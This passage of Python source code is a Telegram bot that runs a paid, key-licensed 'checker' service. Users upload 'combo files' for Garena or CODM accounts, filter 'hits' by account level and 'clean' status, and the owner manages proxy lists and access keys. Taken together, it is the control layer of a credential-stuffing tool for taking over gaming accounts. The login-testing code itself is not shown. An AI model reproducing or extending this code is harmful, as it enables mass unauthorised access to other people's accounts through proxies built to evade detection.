                    {"text": "1 Day",    "callback_data": "gk_dur:86400"},
                    {"text": "3 Days",   "callback_data": "gk_dur:259200"},
                    {"text": "7 Days",   "callback_data": "gk_dur:604800"},
                ],
                [
                    {"text": "30 Days",  "callback_data": "gk_dur:2592000"},
                    {"text": "❌ Cancel","callback_data": "gk_cancel"},
                ],
            ]
        )
        return

    if data == "admin:statuskey":
        if not _is_owner(from_user): return
        _handle_status_key(token, chat_id, from_user, "")
        return

    if data == "admin:deletekey_menu":
        if not _is_owner(from_user): return
        keys = _load_keys()
        now  = time.time()
        if not keys:
            _tg_send(token, chat_id, "📭 <b>No keys found.</b>")
            return
        _deletekey_selection[chat_id] = set()
        kb = _build_deletekey_keyboard(keys, set(), now)
        _tg_send_buttons(token, chat_id,
            _deletekey_header(keys, set(), now), kb)
        return

    if data == "admin:serverstatus":
        if not _is_owner(from_user): return
        _handle_server_status(token, chat_id, from_user)
        return

    if data == "admin:proxystatus":
        if not _is_owner(from_user): return
        _handle_proxy_status(token, chat_id, from_user)
        return

    if data == "admin:upload_proxy":
        if not _is_owner(from_user): return
        _proxy_accumulator.pop(chat_id, None)   # clear any old session
        _proxy_msg_ids.pop(chat_id, None)
        _bot_state[chat_id] = "AWAIT_PROXY"
        _handle_proxy_upload(token, chat_id, from_user, {})
        return

    if data == "admin:refresh":
        if not _is_owner(from_user): return
        _handle_help(token, chat_id, from_user)
        return

    # ── deletekey picker: toggle a single key ──────────────────
    if data.startswith("dk_toggle:"):
        if not _is_owner(from_user): return
        key_name = data[len("dk_toggle:"):]
        sel  = _deletekey_selection.setdefault(chat_id, set())
        if key_name in sel:
            sel.discard(key_name)
        else:
            sel.add(key_name)
        keys = _load_keys()
        now  = time.time()
        kb   = _build_deletekey_keyboard(keys, sel, now)
        _tg_edit_message(token, chat_id, message["message_id"],
            _deletekey_header(keys, sel, now), kb)
        return

    # ── deletekey picker: bulk-select helpers ──────────────────
    if data.startswith("dk_sel:"):
        if not _is_owner(from_user): return
        action = data[len("dk_sel:"):]
        keys   = _load_keys()
        now    = time.time()
        sel    = _deletekey_selection.setdefault(chat_id, set())
        if action == "expired":
            sel |= {k for k, v in keys.items() if now >= v.get("expires", 0)}
        elif action == "unused":
            def _is_unused(v):
                ub = v.get("used_by", [])
                if isinstance(ub, str): return not ub
                return len(ub) == 0
            sel |= {k for k, v in keys.items() if _is_unused(v)}
        elif action == "all":
            sel |= set(keys.keys())
        elif action == "none":
            sel.clear()
        kb = _build_deletekey_keyboard(keys, sel, now)
        _tg_edit_message(token, chat_id, message["message_id"],
            _deletekey_header(keys, sel, now), kb)
        return

    # ── deletekey picker: confirm deletion ─────────────────────
    if data == "dk_confirm":
        if not _is_owner(from_user): return
        sel  = _deletekey_selection.pop(chat_id, set())
        if not sel:
            _tg_answer_callback(token, cq_id, "⚠️ No keys selected!")
            return
        keys    = _load_keys()
        deleted = []
        for k in list(sel):
            if k in keys:
                deleted.append(k)
                del keys[k]
        _save_keys(keys)
        lines = [f"🗑 <b>Deleted {len(deleted)} key(s)</b>\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"]
        for k in deleted:
            lines.append(f"  🔑 <code>{k}</code>")
        lines.append(f"\n📊 <b>Remaining keys: {len(keys)}</b>")
        _tg_edit_message(token, chat_id, message["message_id"],
            "\n".join(lines), [])
        return

    # ── deletekey picker: cancel ───────────────────────────────
    if data == "dk_cancel":
        if not _is_owner(from_user): return
        _deletekey_selection.pop(chat_id, None)
        _tg_edit_message(token, chat_id, message["message_id"],
            "❌ <b>Delete cancelled.</b> No keys were removed.", [])
        return

    # ── deletekey noop (info button) ───────────────────────────
    if data == "dk_noop":
        return

    # ── Genkey wizard — duration chosen → ask users ───────────
    if data.startswith("gk_dur:"):
        if not _is_owner(from_user): return
        duration = int(data.split(":")[1])
        _genkey_wizard[chat_id] = {"step": "AWAIT_USERS", "duration": duration}
        _ask_genkey_users(token, chat_id, duration)
        return

    # ── Genkey wizard — users chosen → ask limit ──────────────
    if data.startswith("gk_usr:"):
        if not _is_owner(from_user): return
        wiz = _genkey_wizard.get(chat_id, {})
        if not wiz or wiz.get("step") != "AWAIT_USERS":
            _tg_send(token, chat_id, "⚠️ Session expired. Use /generate_key again.")
            return
        max_users        = int(data.split(":")[1])
        wiz["step"]      = "AWAIT_LIMIT"
        wiz["max_users"] = max_users
        _ask_genkey_limit(token, chat_id, wiz["duration"], max_users)
        return

    # ── Genkey wizard — limit chosen → ask count ──────────────
    if data.startswith("gk_lim:"):
        if not _is_owner(from_user): return
        wiz = _genkey_wizard.get(chat_id, {})
        if not wiz or wiz.get("step") != "AWAIT_LIMIT":
            _tg_send(token, chat_id, "⚠️ Session expired. Use /generate_key again.")
            return
        limit = int(data.split(":")[1])
        wiz["step"]        = "AWAIT_COUNT"
        wiz["combo_limit"] = limit
        _ask_genkey_count(token, chat_id, wiz["duration"], wiz["max_users"], limit)
        return

    # ── Genkey wizard — count chosen → finalize ───────────────
    if data.startswith("gk_cnt:"):
        if not _is_owner(from_user): return
        wiz = _genkey_wizard.get(chat_id, {})
        if not wiz or wiz.get("step") != "AWAIT_COUNT":
            _tg_send(token, chat_id, "⚠️ Session expired. Use /generate_key again.")
            return
        count = int(data.split(":")[1])
        _finalize_gen_key(token, chat_id, wiz["duration"], wiz["combo_limit"], count, wiz["max_users"])
        return

    # ── Cancel genkey wizard ───────────────────────────────────
    if data == "gk_cancel":
        _genkey_wizard.pop(chat_id, None)
        _tg_send(token, chat_id, "❌ Key generation cancelled.")
        return

    # ── User menu buttons ──────────────────────────────────────
    if data == "user:start":
        if not _check_access(token, chat_id, from_user):
            return
        _handle_start(token, chat_id, from_user)
        return

    if data == "user:reset":
        key_id = str(from_user.get("id", chat_id))
        uname  = from_user.get("username", "")
        _saved_users.pop(key_id, None)
        if uname:
            _saved_users.pop(uname.lstrip("@").lower(), None)
        _save_users_to_disk()
        _user_data.pop(chat_id, None)
        _bot_state.pop(chat_id, None)
        _tg_send(token, chat_id,
            "🗑 <b>Settings cleared!</b>\n\n"
            "Send /start or tap Start to reconfigure.")
        return

    if data == "user:stop":
        _handle_stop_panel(token, chat_id, from_user)
        return

    # ── Stop: stop a specific user's checker ───────────────────
    if data.startswith("stop_user:"):
        if not _is_owner(from_user):
            # Non-owner can only stop their own
            target_id = int(data.split(":")[1])
            if target_id != chat_id:
                _tg_answer_callback(token, cq_id, "🚫 You can only stop your own checker.")
                return
        else:
            target_id = int(data.split(":")[1])

        evt = _stop_events.get(target_id)
        if evt and not evt.is_set():
            evt.set()
            saved = _get_saved_profile(str(target_id))
            uname = saved.get("username", "") if saved else ""
            label = f"@{uname}" if uname else f"id:{target_id}"
            _tg_edit_message(token, chat_id, message["message_id"],
                f"🛑 <b>Stop signal sent to {label}!</b>\n\n"
                f"The checker will stop after the current batch finishes.",
                []
            )
        else:
            _tg_answer_callback(token, cq_id, "ℹ️ That checker already stopped.")
            _tg_edit_message(token, chat_id, message["message_id"],
                "ℹ️ <b>That checker has already finished or stopped.</b>", [])
        return

    # ── Stop: stop ALL running checkers ───────────────────────
    if data == "stop_all":
        if not _is_owner(from_user):
            _tg_answer_callback(token, cq_id, "🚫 Owner only.")
            return
        stopped_count = 0
        for target_id, evt in list(_stop_events.items()):
            if not evt.is_set():
                evt.set()
                stopped_count += 1
        _tg_edit_message(token, chat_id, message["message_id"],
            f"☢️ <b>Stop ALL sent!</b>\n\n"
            f"Sent stop signal to <b>{stopped_count}</b> running checker(s).\n"
            f"They will stop after their current batch finishes.",
            []
        )
        return

    # ── Stop: cancel (dismiss panel) ──────────────────────────
    if data == "stop_cancel":
        _tg_edit_message(token, chat_id, message["message_id"],
            "✅ <b>Cancelled.</b> Checkers keep running.", [])
        return

    if data == "user:redeem":
        _tg_send(token, chat_id,
            "🔑 <b>Redeem Key</b>\n\n"
            "Type your key:\n<code>/redeem YOUR_KEY</code>")
        return

    if data == "user:refresh_help":
        _handle_help(token, chat_id, from_user)
        return

    # ── Redeem: prompt button ──────────────────────────────────
    if data == "redeem:prompt":
        _bot_state[chat_id] = "AWAIT_REDEEM_KEY"
        _tg_send(token, chat_id,
            "🔑 <b>Enter your key:</b>\n\n"
            "<code>/redeem YOUR_KEY_HERE</code>\n\n"
            "<i>Just type it and send!</i>")
        return

    # ── Level picker button ────────────────────────────────────
    if data.startswith("lvl:"):
        if not _check_access(token, chat_id, from_user): return
        val = data[4:]
        level_map = {
            "100": ([100], "Level 100+"),
            "200": ([200], "Level 200+"),
            "300": ([300], "Level 300+"),
            "400": ([400], "Level 400+"),
            "all": ([1],   "ALL levels"),
        }
        if val not in level_map: return
        thresholds, label = level_map[val]
        d = _udata(chat_id)
        d["level"] = thresholds
        _ask_filter(token, chat_id, label)
        return

    # ── Filter picker button ───────────────────────────────────
    if data.startswith("flt:"):
        if not _check_access(token, chat_id, from_user): return
        val = data[4:]
        filter_map = {
            "clean":    ("clean",    "✅ CLEAN only"),
            "notclean": ("notclean", "❌ NOT CLEAN only"),
            "both":     ("both",     "🔄 BOTH"),
        }
        if val not in filter_map: return
        cf_value, cf_label = filter_map[val]
        d = _udata(chat_id)
        d["clean_filter"] = cf_value
        _bot_state[chat_id] = "AWAIT_FILE"
        _save_profile(chat_id, d)
        lvl_label  = "ALL levels" if d.get("level") == [1] else f"Level {d.get('level', [1])[0]}+"
        user_limit = d.get("combo_limit", COMBO_LINE_LIMIT)
        _tg_send(token, chat_id,
            f"✅ <b>Config saved!</b>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"  🆔 Hits ID:  <code>{d.get('hits_id', chat_id)}</code>\n"
            f"  🎮 Level:    <code>{lvl_label}</code>\n"
            f"  🔍 Hit type: <code>{cf_label}</code>\n"
            f"  📦 Limit:    <code>{user_limit} lines</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📂 <b>Upload your combo file to start!</b>\n\n"
            f"<i>Use /reset to change settings.</i>\n\n"
            f"<i>Send your file now ⬇️</i>"
        )
        return

    # ── Proxy accumulator buttons ──────────────────────────────
    if data == "proxy:done":
        if not _is_owner(from_user): return
        _flush_proxy_accumulator(token, chat_id)
        return

    if data == "proxy:cancel":
        if not _is_owner(from_user): return
        msg_ids = _proxy_msg_ids.pop(chat_id, [])
        _proxy_accumulator.pop(chat_id, None)
        _bot_state.pop(chat_id, None)
        # Delete all pasted messages and bot replies
        if msg_ids:
            _tg_delete_messages_bulk(token, chat_id, msg_ids)
        _tg_send(token, chat_id, "🗑 <b>Proxy upload cancelled.</b> Accumulator cleared.")
        return


def handle_bot_update(token: str, update: dict, _unused_config):
    try:
        _handle_bot_update_inner(token, update, _unused_config)
    except Exception as e:
        logger.error(f"[BOT] ❌ Unhandled error in update handler: {e}", exc_info=True)
        try:
            chat_id = (update.get("message") or update.get("callback_query", {}).get("message") or {}).get("chat", {}).get("id")
            if chat_id:
                _tg_send(token, chat_id, "⚠️ An error occurred. Please try again.")
        except Exception:
            pass


def _parse_command(text: str):
    """
    Parse a Telegram command from text.
    Returns (command, args) tuple. Command is lowercase without @botname suffix.
    e.g. '/start@MyBot hello' -> ('start', 'hello')
         '/generate_key 1d'   -> ('generate_key', '1d')
         'hello'              -> ('', 'hello')
    """
    if not text or not text.startswith("/"):
        return ("", text)
    parts = text.split(None, 1)  # split on first whitespace
    cmd_part = parts[0].lower()   # e.g. '/start@mybot'
    args = parts[1] if len(parts) > 1 else ""
    # Strip the leading '/' and any @botname suffix
    cmd_part = cmd_part[1:]  # remove '/'
    if "@" in cmd_part:
        cmd_part = cmd_part.split("@")[0]
    return (cmd_part, args.strip())


def _handle_bot_update_inner(token: str, update: dict, _unused_config):
    # ── Inline button presses ──────────────────────────────────
    if update.get("callback_query"):
        _handle_callback_query(token, update["callback_query"])
        return

    msg = update.get("message") or update.get("edited_message")
    if not msg:
        return

    chat_id   = msg["chat"]["id"]
    from_user = msg.get("from", {})
    text      = msg.get("text", "").strip()
    cmd, cmd_args = _parse_command(text)

    if cmd:
        logger.info(f"[BOT] 📩 cmd={cmd!r} args={cmd_args!r} from={from_user.get('id')} chat={chat_id}")

    # ── Intercept text replies for genkey wizard ───────────────
    if _is_owner(from_user) and chat_id in _genkey_wizard:
        wiz = _genkey_wizard[chat_id]
        if wiz["step"] == "AWAIT_DURATION" and text and not text.startswith("/"):
            dur = _parse_duration(text)
            if dur > 0:
                wiz["step"]     = "AWAIT_USERS"
                wiz["duration"] = dur
                _ask_genkey_users(token, chat_id, dur)
            else:
                _tg_send(token, chat_id,
                    "❌ Invalid format. Try: <code>1d</code>  <code>12hrs</code>  <code>45min</code>")
            return
        if wiz["step"] == "AWAIT_USERS" and text and not text.startswith("/"):
            try:
                max_users = int(text.strip())
                if max_users < 0: raise ValueError
                wiz["step"]      = "AWAIT_LIMIT"
                wiz["max_users"] = max_users
                _ask_genkey_limit(token, chat_id, wiz["duration"], max_users)
            except ValueError:
                _tg_send(token, chat_id,
                    "❌ Enter a number (e.g. <code>10</code>) or <code>0</code> for unlimited.")
            return
        if wiz["step"] == "AWAIT_LIMIT" and text and not text.startswith("/"):
            try:
                limit = int(text.strip())
                if limit < 0: raise ValueError
                wiz["step"]        = "AWAIT_COUNT"
                wiz["combo_limit"] = limit
                _ask_genkey_count(token, chat_id, wiz["duration"], wiz["max_users"], limit)
            except ValueError:
                _tg_send(token, chat_id,
                    "❌ Please enter a valid number (e.g. <code>1000</code>) or <code>0</code> for unlimited.")
            return
        if wiz["step"] == "AWAIT_COUNT" and text and not text.startswith("/"):
            try:
                count = int(text.strip())
                if count < 1 or count > 500: raise ValueError
                _finalize_gen_key(token, chat_id, wiz["duration"], wiz["combo_limit"], count, wiz["max_users"])
            except ValueError:
                _tg_send(token, chat_id,
                    "❌ Enter a number between <code>1</code> and <code>500</code>.")
            return

    # ── /stop — shows interactive stop panel ──────────────────
    if cmd == "stop":
        _handle_stop_panel(token, chat_id, from_user)
        return

    # ── Owner-only commands ────────────────────────────────────
    if cmd == "help":
        _handle_help(token, chat_id, from_user)
        return

    if cmd == "generate_key":
        _handle_gen_key(token, chat_id, from_user, cmd_args)
        return

    if cmd == "upload_proxy":
        _proxy_accumulator.pop(chat_id, None)   # clear any old session
        _proxy_msg_ids.pop(chat_id, None)
        _bot_state[chat_id] = "AWAIT_PROXY"
        _handle_proxy_upload(token, chat_id, from_user, msg)
        return

    if cmd == "proxy_done":
        if not _is_owner(from_user):
            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
            return
        if chat_id in _proxy_accumulator and _proxy_accumulator[chat_id]:
            user_msg_id = msg.get("message_id")
            if user_msg_id:
                _proxy_msg_ids.setdefault(chat_id, []).append(user_msg_id)
            _flush_proxy_accumulator(token, chat_id)
            _bot_state.pop(chat_id, None)
        else:
            _tg_send(token, chat_id,
                "📭 <b>No proxy lines to save.</b>\n\n"
                "Use /upload_proxy first to paste proxy lines, then /proxy_done to save them.")
        return

    if cmd == "proxystatus":
        _handle_proxy_status(token, chat_id, from_user)
        return

    if cmd == "add_coowner":
        if not _is_primary_owner(from_user):
            _tg_send(token, chat_id, "🚫 <b>Primary owner only command.</b>")
            return
        args = cmd_args
        if not args:
            # Show current co-owners and instructions
            if COOWNER_IDS:
                colist = "\n".join(f"  • <code>{uid}</code>" for uid in sorted(COOWNER_IDS))
            else:
                colist = "  <i>None</i>"
            _tg_send(token, chat_id,
                f"👥 <b>Co-Owner Management</b>\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📋 <b>Current co-owners:</b>\n{colist}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"<b>Usage:</b>\n"
                f"<code>/add_coowner 123456789</code> — add a co-owner\n"
                f"<code>/remove_coowner 123456789</code> — remove a co-owner\n\n"
                f"<i>Co-owners have full owner access (generate keys, upload proxy, etc.)</i>")
            return
        try:
            co_uid = int(args)
        except ValueError:
            _tg_send(token, chat_id, "❌ <b>Invalid ID.</b> Use a numeric Telegram user ID.\n\nExample: <code>/add_coowner 123456789</code>")
            return
        if co_uid == OWNER_ID:
            _tg_send(token, chat_id, "⚠️ That's already the primary owner ID.")
            return
        if co_uid in COOWNER_IDS:
            _tg_send(token, chat_id, f"ℹ️ <code>{co_uid}</code> is already a co-owner.")
            return
        _add_coowner(co_uid)
        _tg_send(token, chat_id,
            f"✅ <b>Co-owner added!</b>\n\n"
            f"🆔 <code>{co_uid}</code> now has owner-level access.\n"
            f"👥 Total co-owners: <b>{len(COOWNER_IDS)}</b>")
        return

    if cmd == "remove_coowner":
        if not _is_primary_owner(from_user):
            _tg_send(token, chat_id, "🚫 <b>Primary owner only command.</b>")
            return
        args = cmd_args
        if not args:
            if COOWNER_IDS:
                colist = "\n".join(f"  • <code>{uid}</code>" for uid in sorted(COOWNER_IDS))
            else:
                colist = "  <i>None</i>"
            _tg_send(token, chat_id,
                f"👥 <b>Remove Co-Owner</b>\n\n"
                f"📋 <b>Current co-owners:</b>\n{colist}\n\n"
                f"<b>Usage:</b> <code>/remove_coowner 123456789</code>")
            return
        try:
            co_uid = int(args)
        except ValueError:
            _tg_send(token, chat_id, "❌ <b>Invalid ID.</b> Use a numeric Telegram user ID.")
            return
        if co_uid not in COOWNER_IDS:
            _tg_send(token, chat_id, f"ℹ️ <code>{co_uid}</code> is not a co-owner.")
            return
        _remove_coowner(co_uid)
        _tg_send(token, chat_id,
            f"✅ <b>Co-owner removed!</b>\n\n"
            f"🆔 <code>{co_uid}</code> no longer has owner access.\n"
            f"👥 Remaining co-owners: <b>{len(COOWNER_IDS)}</b>")
        return

    if cmd == "serverstatus":
        _handle_server_status(token, chat_id, from_user)
        return

    if cmd == "resetconfig":
        if not _is_owner(from_user):
            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
            return
        # Delete config.json so next restart triggers the wizard again
        if os.path.exists(CONFIG_FILE):
            os.remove(CONFIG_FILE)
        _tg_send(token, chat_id,
            "🗑 <b>Config deleted!</b>\n\n"
            "Restart the bot — it will ask for your token and owner ID again.")
        return

    if cmd == "stopall":
        if not _is_owner(from_user):
            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
            return
        stopped_count = 0
        for target_id, evt in list(_stop_events.items()):
            if not evt.is_set():
                evt.set()
                stopped_count += 1
        if stopped_count:
            _tg_send(token, chat_id,
                f"☢️ <b>Stop ALL sent!</b>\n\n"
                f"Sent stop signal to <b>{stopped_count}</b> running checker(s).")
        else:
            _tg_send(token, chat_id, "ℹ️ No checkers are currently running.")
        return

    if cmd == "statuskey":
        _handle_status_key(token, chat_id, from_user, cmd_args)
        return

    if cmd == "deletekey":
        _handle_delete_key(token, chat_id, from_user, cmd_args)
        return

    # ── Proxy file upload state ────────────────────────────────
    if _bot_state.get(chat_id) == "AWAIT_PROXY":
        if msg.get("document"):
            # File upload — process immediately and exit proxy mode
            _proxy_msg_ids.pop(chat_id, None)   # clear tracker, not a pasted session
            _handle_proxy_upload(token, chat_id, from_user, msg)
            _bot_state.pop(chat_id, None)
        elif cmd in ("done", "proxy_done") or text.lower() == "done":
            # Flush accumulated lines — will auto-delete tracked messages
            user_msg_id = msg.get("message_id")
            if user_msg_id:
                _proxy_msg_ids.setdefault(chat_id, []).append(user_msg_id)
            _flush_proxy_accumulator(token, chat_id)
            _bot_state.pop(chat_id, None)
        elif text and not text.startswith("/"):
            # More proxy lines — accumulate, stay in AWAIT_PROXY
            _handle_proxy_upload(token, chat_id, from_user, msg)
            # NOTE: do NOT pop state — owner may send more batches
        else:
            bot_reply = _tg_send_buttons(token, chat_id,
                "📡 Keep sending proxy lines, or tap Done when finished.",
                [
                    [
                        {"text": "✅ Done (save all)", "callback_data": "proxy:done"},
                        {"text": "🗑 Clear & Cancel",  "callback_data": "proxy:cancel"},
                    ],
                ]
            )
            if bot_reply and bot_reply.get("ok"):
                _proxy_msg_ids.setdefault(chat_id, []).append(
                    bot_reply["result"]["message_id"])
        return

    # ── /start — always allowed, no key required ─────────────
    # CRITICAL: /start must never be blocked — it is how new users
    # arrive and how they reach /redeem to get a key.
    if cmd == "start":
        _handle_start(token, chat_id, from_user)
        return

    # ── /reset — always allowed (lets users clear broken state) ─
    if cmd == "reset":
        key_id = str(from_user.get("id", chat_id))
        uname  = from_user.get("username", "")
        _saved_users.pop(key_id, None)
        if uname:
            _saved_users.pop(uname.lstrip("@").lower(), None)
        _save_users_to_disk()
        _user_data.pop(chat_id, None)
        _bot_state.pop(chat_id, None)
        _tg_send(token, chat_id,
            "🗑 <b>Settings cleared!</b>\n\n"
            "Send /start to choose your level and hit type again.")
        return

    # ── /redeem — always allowed (users need this to get access) ─
    if cmd == "redeem":
        _handle_redeem(token, chat_id, from_user, cmd_args)
        return

    # ── Waiting for user to type their key (no access needed) ──
    if _bot_state.get(chat_id) == "AWAIT_REDEEM_KEY":
        if text and not text.startswith("/"):
            _bot_state.pop(chat_id, None)
            _handle_redeem(token, chat_id, from_user, text.strip())
        elif cmd == "redeem":
            _bot_state.pop(chat_id, None)
            _handle_redeem(token, chat_id, from_user, cmd_args)
        else:
            _tg_send(token, chat_id,
                "🔑 Just type your key and send it, or use:\n"
                "<code>/redeem YOUR_KEY</code>")
        return

    # ── Access gate for all other interactions ─────────────────
    if not _check_access(token, chat_id, from_user):
        return

    # ── Auto-restore saved profile if state was lost (e.g. bot restart) ──
    if chat_id not in _bot_state:
        tg_id  = from_user.get("id", chat_id)
        uname  = from_user.get("username", "")
        saved  = _get_saved_profile(str(tg_id)) or (
            _get_saved_profile(uname.lower()) if uname else None
        )
        if saved:
            d = _udata(chat_id)
            d["hits_id"]      = saved["hits_id"]
            d["username"]     = saved.get("username", uname)
            d["level"]        = saved["level"]
            d["clean_filter"] = saved["clean_filter"]
            d["key"]          = saved.get("key")
            d["key_expires"]  = saved.get("key_expires", 0)
            d["combo_limit"]  = saved.get("combo_limit", COMBO_LINE_LIMIT)
            _bot_state[chat_id] = "AWAIT_FILE"
        else:
            _bot_state[chat_id] = "AWAIT_LEVEL"

    state = _bot_state.get(chat_id, "AWAIT_LEVEL")

    if state == "AWAIT_LEVEL":
        if text:
            _handle_level(token, chat_id, text)
        else:
            _ask_level(token, chat_id)
        return

    if state == "AWAIT_FILTER":
        if text:
            _handle_filter(token, chat_id, text)
        else:
            d = _udata(chat_id)
            lvl_label = "ALL levels" if d.get("level") == [1] else f"Level {d.get('level', [1])[0]}+"
            _ask_filter(token, chat_id, lvl_label)
        return

    if state == "RUNNING":
        _tg_send(token, chat_id,
            "⏳ <b>Checker is still running.</b>\n"
            "Send /stop to cancel, or wait for it to finish.")
        return

    if state == "AWAIT_FILE":
        if msg.get("document"):
            _handle_file(token, chat_id, msg, from_user)
        else:
            _tg_send(token, chat_id,
                "📂 Please upload your combo file.\n"
                "<i>Name must contain 'garena' or 'codm'</i>\n"
                "(e.g. <code>garena.txt</code>, <code>codm.txt</code>, <code>Yuki_garena.txt</code>)\n"
                "Or send /start to reset settings.")


# ── long-poll loop (single daemon thread, handles all users) ───
def start_bot_polling(token: str, _unused=None):
    offset = 0
    consecutive_errors = 0
    _update_executor = ThreadPoolExecutor(max_workers=4, thread_name_prefix="BotUpdate")

    def _create_poll_session():
        """Create a fresh polling session with keep-alive."""
        s = requests.Session()
        s.mount("https://", requests.adapters.HTTPAdapter(
            pool_connections=2, pool_maxsize=4, max_retries=1
        ))
        return s

    poll_session = _create_poll_session()

    def _safe_handle(upd):
        """Process a single update in the thread pool — never blocks polling."""
        try:
            handle_bot_update(token, upd, None)
        except Exception as e:
            logger.error(f"[BOT] Update error: {e}", exc_info=True)

    def _poll():
        nonlocal offset, poll_session, consecutive_errors
        logger.info("[BOT] 🤖 Polling started — waiting for users...")
        while not shutdown_event.is_set():
            try:
                r = poll_session.get(
                    f"https://api.telegram.org/bot{token}/getUpdates",
                    params={"timeout": 30, "offset": offset},
                    timeout=35
                )
                consecutive_errors = 0  # reset on success

                if r.status_code == 429:
                    retry_after = int(r.headers.get("Retry-After", 10))
                    logger.warning(f"[BOT] Polling rate-limited — sleeping {retry_after}s")
                    time.sleep(retry_after)
                    continue
                if r.status_code == 409:
                    logger.warning("[BOT] Conflict (409) — another bot instance running? Retrying in 3s")
                    time.sleep(3)
                    continue
                if r.status_code != 200:
                    logger.warning(f"[BOT] getUpdates HTTP {r.status_code} — retrying in 5s")
                    time.sleep(5)
                    continue
                try:
                    payload = r.json()
                except ValueError:
                    logger.warning("[BOT] getUpdates returned non-JSON response — retrying in 5s")
                    time.sleep(5)
                    continue
                for upd in payload.get("result", []):
                    offset = upd["update_id"] + 1
                    _update_executor.submit(_safe_handle, upd)
            except requests.exceptions.Timeout:
                # Long-poll timeout is normal — just loop again immediately
                continue
            except (requests.exceptions.ConnectionError,
                    requests.exceptions.ChunkedEncodingError,
                    ConnectionResetError, OSError) as e:
                consecutive_errors += 1
                wait = min(5 * consecutive_errors, 30)
                logger.warning(f"[BOT] Connection error #{consecutive_errors}: {e} — retrying in {wait}s")
                time.sleep(wait)
                # Recreate session after 3 consecutive connection errors
                if consecutive_errors >= 3:
                    try:
                        poll_session.close()
                    except Exception:
                        pass
                    poll_session = _create_poll_session()
                    logger.info("[BOT] 🔄 Recreated polling session after repeated errors")
                    consecutive_errors = 0
            except Exception as e:
                consecutive_errors += 1
                logger.warning(f"[BOT] Poll error: {e}")
                time.sleep(5)

    threading.Thread(target=_poll, daemon=True).start()


def main():
    global BOT_MODE
    print_banner()

    # ── Railway-safe signal handling (SIGTERM for graceful shutdown) ──
    def _graceful_shutdown(signum, frame):
        logger.warning(f"[MAIN] Received signal {signum} — shutting down gracefully...")
        shutdown_event.set()
        # Set all user stop events so running checkers stop
        with _stop_events_lock:
            for evt in _stop_events.values():
                evt.set()
    signal.signal(signal.SIGTERM, _graceful_shutdown)
    signal.signal(signal.SIGINT,  _graceful_shutdown)

    proxy_file_names = [os.path.basename(p) for p in PROXY_FILES]
    logger.info(
        f"[GEO] Proxy rotator active -> {geo_rotator.current_proxy} "
        f"({geo_rotator.total} proxies) | Files: "
        f"{', '.join(proxy_file_names) if proxy_file_names else 'none found'}"
    )

    # ── Start Telegram bot ────────────────────────────────────
    BOT_MODE = True
    _cleanup_stale_files()
    start_bot_polling(BOT_TOKEN, None)
    _tg_set_commands(BOT_TOKEN)

    # ── Memory watchdog — 3-tier adaptive throttle ───────────────
    # Tier 1 (>80%): reduce to 3 threads (warn)
    # Tier 2 (>87%): reduce to 2 threads (critical)
    # Tier 3 (>93%): reduce to 1 thread  (emergency — stop new work)
    def _memory_watchdog():
        try:
            import psutil
        except ImportError:
            logger.warning("[WATCHDOG] psutil not installed — RAM watchdog disabled. Install with: pip install psutil")
            return

        # Track last tier to avoid log spam
        last_tier = 0

        while not shutdown_event.is_set():
            try:
                mem  = psutil.virtual_memory()
                pct  = mem.percent
                free = mem.available // (1024 * 1024)  # MB

                # ── Determine tier ─────────────────────────────────
                if pct >= 93:
                    tier   = 3
                    target = 1
                    label  = "🚨 EMERGENCY"
                elif pct >= 87:
                    tier   = 2
                    target = 2
                    label  = "🔴 CRITICAL"
                elif pct >= 80:
                    tier   = 1
                    target = 3
                    label  = "🟡 WARNING"
                else:
                    tier   = 0
                    target = MAX_GLOBAL_THREADS
                    label  = "🟢 OK"

                # ── Only act/log on tier change ─────────────────────
                if tier != last_tier:
                    if tier > 0:
                        # Force garbage collection on high memory
                        gc.collect()
                        logger.warning(
                            f"[WATCHDOG] {label} — RAM {pct:.1f}% ({free}MB free) "
                            f"→ throttling to {target} thread(s)"
                        )
                        # Drain excess semaphore slots down to target
                        drained = 0
                        while _global_thread_sem._value > target:
                            if _global_thread_sem.acquire(blocking=False):
                                drained += 1
                            else:
                                break
                        if drained:
                            logger.warning(f"[WATCHDOG] Drained {drained} slot(s) — semaphore now at {target}")
                    else:
                        # Recovering — restore semaphore to full
                        current = _global_thread_sem._value
                        restore = MAX_GLOBAL_THREADS - current
                        for _ in range(restore):
                            _global_thread_sem.release()
                        if restore:
                            logger.info(f"[WATCHDOG] 🟢 RAM recovered ({pct:.1f}%) — restored {restore} thread slot(s)")
                    last_tier = tier

                # Tier 3 emergency: notify owner via Telegram
                if tier == 3 and last_tier != 3:
                    try:
                        _tg_send(BOT_TOKEN, OWNER_ID,
                            f"🚨 <b>Server RAM Emergency!</b>\n\n"
                            f"RAM at <b>{pct:.1f}%</b> ({free}MB free)\n"
                            f"Throttled to 1 checker thread.\n"
                            f"<i>Consider stopping some checkers with /stopall</i>")
                    except Exception:
                        pass

            except Exception as e:
                logger.debug(f"[WATCHDOG] Error: {e}")

            # Periodic GC every cycle to keep memory lean on Railway
            try:
                gc.collect()
            except Exception:
                pass

            # Check every 8s — fast enough to catch spikes
            time.sleep(8)

    threading.Thread(target=_memory_watchdog, daemon=True, name="MemWatchdog").start()

    # ── Railway keep-alive heartbeat ─────────────────────────
    def _railway_heartbeat():
        """Periodic heartbeat log to prevent Railway from thinking the process is idle."""
        while not shutdown_event.is_set():
            time.sleep(300)  # every 5 minutes
            try:
                active = sum(1 for s in _bot_state.values() if s == "RUNNING")
                logger.info(f"[HEARTBEAT] 💓 Bot alive | {active} active checker(s) | threads: {MAX_GLOBAL_THREADS}")
            except Exception:
                pass
    threading.Thread(target=_railway_heartbeat, daemon=True, name="RailwayHeartbeat").start()

    bot_console.print(
        "[bold green]🤖 Bot is running![/bold green]\n"
        "[cyan]Flow: /start → level → hit type → upload file → progress bar → hits sent to your ID[/cyan]"
    )
    bot_console.print("[dim]Press Ctrl+C to stop.[/dim]\n")

    # Keep the main thread alive — catch ALL exceptions to prevent crash-exit
    while not shutdown_event.is_set():
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            break
